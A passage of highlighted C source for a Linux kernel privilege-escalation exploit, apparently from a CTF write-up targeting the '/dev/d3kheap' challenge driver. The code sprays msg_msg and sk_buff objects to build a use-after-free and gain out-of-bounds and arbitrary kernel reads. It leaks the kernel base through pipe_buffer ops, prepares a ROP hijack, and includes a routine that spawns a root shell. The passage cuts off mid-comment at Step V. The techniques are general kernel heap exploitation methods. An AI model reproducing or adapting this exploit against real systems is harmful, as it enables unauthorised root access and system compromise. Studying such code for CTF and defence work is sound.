skb_shared_info need to take 320 bytes at the tail</span></span><br><span class="line"><span class="comment"> * so the max size of buf we should send is:</span></span><br><span class="line"><span class="comment"> * 1024 - 320 = 704</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">char</span> fake_secondary_msg[<span class="number">704</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(dev_fd, OBJ_ADD);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">del</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(dev_fd, OBJ_DEL);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span>    next;</span><br><span class="line">    <span class="type">uint64_t</span>    prev;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">    <span class="type">uint64_t</span>    m_type;</span><br><span class="line">    <span class="type">uint64_t</span>    m_ts;</span><br><span class="line">    <span class="type">uint64_t</span>    next;</span><br><span class="line">    <span class="type">uint64_t</span>    security;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span>    next;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">long</span> mtype;</span><br><span class="line">    <span class="type">char</span> mtext[PRIMARY_MSG_SIZE - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg)];</span><br><span class="line">&#125;primary_msg;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">long</span> mtype;</span><br><span class="line">    <span class="type">char</span> mtext[SECONDARY_MSG_SIZE - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg)];</span><br><span class="line">&#125;secondary_msg;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">long</span> mtype;</span><br><span class="line">    <span class="type">char</span> mtext[<span class="number">0x1000</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg) + <span class="number">0x1000</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msgseg)];</span><br><span class="line">&#125; oob_msg;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span>    page;</span><br><span class="line">    <span class="type">uint32_t</span>    offset, len;</span><br><span class="line">    <span class="type">uint64_t</span>    ops;</span><br><span class="line">    <span class="type">uint32_t</span>    flags;</span><br><span class="line">    <span class="type">uint32_t</span>    padding;</span><br><span class="line">    <span class="type">uint64_t</span>    private;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span>    confirm;</span><br><span class="line">    <span class="type">uint64_t</span>    release;</span><br><span class="line">    <span class="type">uint64_t</span>    try_steal;</span><br><span class="line">    <span class="type">uint64_t</span>    get;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">errExit</span><span class="params">(<span class="type">char</span> *msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error: %s\033[0m\n&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">readMsg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="type">long</span>), msgtyp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">writeMsg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span></span><br><span class="line">&#123;</span><br><span class="line">    *(<span class="type">long</span>*)msgp = msgtyp;</span><br><span class="line">    <span class="keyword">return</span> msgsnd(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="type">long</span>), <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">peekMsg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="type">long</span>), msgtyp, MSG_COPY | IPC_NOWAIT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">buildMsg</span><span class="params">(<span class="keyword">struct</span> msg_msg *msg, <span class="type">uint64_t</span> m_list_next,</span></span><br><span class="line"><span class="params">    <span class="type">uint64_t</span> m_list_prev, <span class="type">uint64_t</span> m_type, <span class="type">uint64_t</span> m_ts, </span></span><br><span class="line"><span class="params">    <span class="type">uint64_t</span> next, <span class="type">uint64_t</span> security)</span></span><br><span class="line">&#123;</span><br><span class="line">    msg-&gt;m_list.next = m_list_next;</span><br><span class="line">    msg-&gt;m_list.prev = m_list_prev;</span><br><span class="line">    msg-&gt;m_type = m_type;</span><br><span class="line">    msg-&gt;m_ts = m_ts;</span><br><span class="line">    msg-&gt;next = next;</span><br><span class="line">    msg-&gt;security = security;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">spraySkBuff</span><span class="params">(<span class="type">int</span> sk_socket[SOCKET_NUM][<span class="number">2</span>], <span class="type">void</span> *buf, <span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// printf(&quot;[-] now %d, num %d\n&quot;, i, j);</span></span><br><span class="line">            <span class="keyword">if</span> (write(sk_socket[i][<span class="number">0</span>], buf, size) &lt; <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">freeSkBuff</span><span class="params">(<span class="type">int</span> sk_socket[SOCKET_NUM][<span class="number">2</span>], <span class="type">void</span> *buf, <span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">            <span class="keyword">if</span> (read(sk_socket[i][<span class="number">1</span>], buf, size) &lt; <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getRootShell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (getuid())</span><br><span class="line">        errExit(<span class="string">&quot;failed to gain the root!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Succesfully gain the root privilege, trigerring root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span>         oob_pipe_fd[<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span>         sk_sockets[SOCKET_NUM][<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span>         pipe_fd[PIPE_NUM][<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span>         msqid[MSG_QUEUE_NUM];</span><br><span class="line">    <span class="type">int</span>         victim_qid, real_qid;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span>  *<span class="title">nearby_msg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span>  *<span class="title">nearby_msg_prim</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">pipe_buf_ptr</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops_ptr</span>;</span></span><br><span class="line">    <span class="type">uint64_t</span>    victim_addr;</span><br><span class="line">    <span class="type">uint64_t</span>    kernel_base;</span><br><span class="line">    <span class="type">uint64_t</span>    kernel_offset;</span><br><span class="line">    <span class="type">uint64_t</span>    *rop_chain;</span><br><span class="line">    <span class="type">int</span>         rop_idx;</span><br><span class="line">    <span class="type">cpu_set_t</span>   cpu_set;</span><br><span class="line"></span><br><span class="line">    saveStatus();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.O</span></span><br><span class="line"><span class="comment">     * Initialization</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// run the exp on specific core only</span></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(<span class="number">0</span>, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// socket pairs to spray sk_buff</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">        <span class="keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="number">0</span>, sk_sockets[i]) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create socket pair!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    dev_fd = open(<span class="string">&quot;/dev/d3kheap&quot;</span>, O_RDONLY);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.I</span></span><br><span class="line"><span class="comment">     * build msg_queue, spray primary and secondary msg_msg,</span></span><br><span class="line"><span class="comment">     * and use OOB write to construct the overlapping</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.I spray msg_msg, construct overlapping object\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Build message queue...&quot;</span>);</span><br><span class="line">    <span class="comment">// build 4096 message queue</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((msqid[i] = msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT)) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create msg_queue!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Spray primary and secondary msg_msg...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;primary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(primary_msg));</span><br><span class="line">    <span class="built_in">memset</span>(&amp;secondary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(secondary_msg));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// get a free object</span></span><br><span class="line">    add();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// spray primary and secondary message</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        *(<span class="type">int</span> *)&amp;primary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">        *(<span class="type">int</span> *)&amp;primary_msg.mtext[<span class="number">4</span>] = i;</span><br><span class="line">        <span class="keyword">if</span> (writeMsg(msqid[i], &amp;primary_msg, </span><br><span class="line">                <span class="keyword">sizeof</span>(primary_msg), PRIMARY_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to send primary msg!&quot;</span>);</span><br><span class="line"></span><br><span class="line">        *(<span class="type">int</span> *)&amp;secondary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">        *(<span class="type">int</span> *)&amp;secondary_msg.mtext[<span class="number">4</span>] = i;</span><br><span class="line">        <span class="keyword">if</span> (writeMsg(msqid[i], &amp;secondary_msg, </span><br><span class="line">                <span class="keyword">sizeof</span>(secondary_msg), SECONDARY_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to send secondary msg!&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">1024</span>)</span><br><span class="line">            del();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.II</span></span><br><span class="line"><span class="comment">     * construct UAF</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.II construct UAF\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// free the victim secondary msg_msg, then we get a UAF</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Trigger UAF...&quot;</span>);</span><br><span class="line">    del();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// spray sk_buff to mark the UAF msg_msg</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray sk_buff...&quot;</span>);</span><br><span class="line">    buildMsg((<span class="keyword">struct</span> msg_msg *)fake_secondary_msg, </span><br><span class="line">            *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, </span><br><span class="line">            *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, SECONDARY_MSG_SIZE, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// find out the UAF queue</span></span><br><span class="line">    victim_qid = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * the msg_msg got changed, so we can&#x27;t read out</span></span><br><span class="line"><span class="comment">         * but it tells us which one the victim is</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">if</span> (peekMsg(msqid[i], &amp;secondary_msg, <span class="keyword">sizeof</span>(secondary_msg), <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] victim qid: %d\n&quot;</span>, i);</span><br><span class="line">            victim_qid = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (victim_qid == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to make the UAF in msg queue!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (freeSkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] UAF construction complete!\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.III</span></span><br><span class="line"><span class="comment">     * spray sk_buff to leak msg_msg addr</span></span><br><span class="line"><span class="comment">     * construct fake msg_msg to leak addr of UAF obj</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.III spray sk_buff to leak kheap addr\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// spray sk_buff to construct fake msg_msg</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray sk_buff...&quot;</span>);</span><br><span class="line">    buildMsg((<span class="keyword">struct</span> msg_msg *)fake_secondary_msg, </span><br><span class="line">            *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, </span><br><span class="line">            VICTIM_MSG_TYPE, <span class="number">0x1000</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg), <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// use fake msg_msg to read OOB</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] OOB read from victim msg_msg&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (peekMsg(msqid[victim_qid], &amp;oob_msg, <span class="keyword">sizeof</span>(oob_msg), <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to read victim msg!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (*(<span class="type">int</span> *)&amp;oob_msg.mtext[SECONDARY_MSG_SIZE] != MSG_TAG)</span><br><span class="line">        errExit(<span class="string">&quot;failed to rehit the UAF object!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    nearby_msg = (<span class="keyword">struct</span> msg_msg*) </span><br><span class="line">            &amp;oob_msg.mtext[(SECONDARY_MSG_SIZE) - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg)];</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of primary msg of msg nearby victim: \033[0m%llx\n&quot;</span>, </span><br><span class="line">            nearby_msg-&gt;m_list.prev);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// release and re-spray sk_buff to construct fake msg_msg</span></span><br><span class="line">    <span class="comment">// so that we can make an arbitrary read on a primary msg_msg</span></span><br><span class="line">    <span class="keyword">if</span> (freeSkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    buildMsg((<span class="keyword">struct</span> msg_msg *)fake_secondary_msg, </span><br><span class="line">            *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, </span><br><span class="line">            VICTIM_MSG_TYPE, <span class="keyword">sizeof</span>(oob_msg.mtext), </span><br><span class="line">            nearby_msg-&gt;m_list.prev - <span class="number">8</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] arbitrary read on primary msg of msg nearby victim&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (peekMsg(msqid[victim_qid], &amp;oob_msg, <span class="keyword">sizeof</span>(oob_msg), <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to read victim msg!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (*(<span class="type">int</span> *)&amp;oob_msg.mtext[<span class="number">0x1000</span>] != MSG_TAG)</span><br><span class="line">        errExit(<span class="string">&quot;failed to rehit the UAF object!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// cal the addr of UAF obj by the header we just read out</span></span><br><span class="line">    nearby_msg_prim = (<span class="keyword">struct</span> msg_msg*) </span><br><span class="line">            &amp;oob_msg.mtext[<span class="number">0x1000</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg)];</span><br><span class="line">    victim_addr = nearby_msg_prim-&gt;m_list.next - <span class="number">0x400</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of msg next to victim: \033[0m%llx\n&quot;</span>, </span><br><span class="line">            nearby_msg_prim-&gt;m_list.next);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of msg UAF object: \033[0m%llx\n&quot;</span>, victim_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.IV</span></span><br><span class="line"><span class="comment">     * fix the header of UAF obj and release it</span></span><br><span class="line"><span class="comment">     * spray pipe_buffer and leak the kernel base</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.IV spray pipe_buffer to leak kernel base\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// re-construct the msg_msg to fix it</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] fixing the UAF obj as a msg_msg...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (freeSkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">memset</span>(fake_secondary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(fake_secondary_msg));</span><br><span class="line">    buildMsg((<span class="keyword">struct</span> msg_msg *)fake_secondary_msg, </span><br><span class="line">            victim_addr + <span class="number">0x800</span>, victim_addr + <span class="number">0x800</span>, <span class="comment">// a valid kheap addr is valid</span></span><br><span class="line">            VICTIM_MSG_TYPE, SECONDARY_MSG_SIZE - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg), </span><br><span class="line">            <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// release UAF obj as secondary msg</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] release UAF obj in message queue...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (readMsg(msqid[victim_qid], &amp;secondary_msg, </span><br><span class="line">                <span class="keyword">sizeof</span>(secondary_msg), VICTIM_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to receive secondary msg!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// spray pipe_buffer</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray pipe_buffer...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create pipe!&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// write something to activate it</span></span><br><span class="line">        <span class="keyword">if</span> (write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;arttnba3&quot;</span>, <span class="number">8</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to write the pipe!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// release the sk_buff to read pipe_buffer, leak kernel base</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] release sk_buff to read pipe_buffer...&quot;</span>);</span><br><span class="line">    pipe_buf_ptr = (<span class="keyword">struct</span> pipe_buffer *) &amp;fake_secondary_msg;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (read(sk_sockets[i][<span class="number">1</span>], &amp;fake_secondary_msg, </span><br><span class="line">                    <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">                errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (pipe_buf_ptr-&gt;ops &gt; <span class="number">0xffffffff81000000</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] got anon_pipe_buf_ops: \033[0m%llx\n&quot;</span>, </span><br><span class="line">                        pipe_buf_ptr-&gt;ops);</span><br><span class="line">                kernel_offset = pipe_buf_ptr-&gt;ops - ANON_PIPE_BUF_OPS;</span><br><span class="line">                kernel_base = <span class="number">0xffffffff81000000</span> + kernel_offset;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] kernel base: \033[0m%llx \033[32m\033[1moffset: \033[0m%llx\n&quot;</span>, </span><br><span class="line">            kernel_base, kernel_offset);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.V</span></span><br><span class="line"><span class="comment">     * hijack the ops of pipe_buffer</span></span><br><span class="line"><span class="comment">     * free all pipe to trigger fake ptr</span></span><br><span class="line"><span 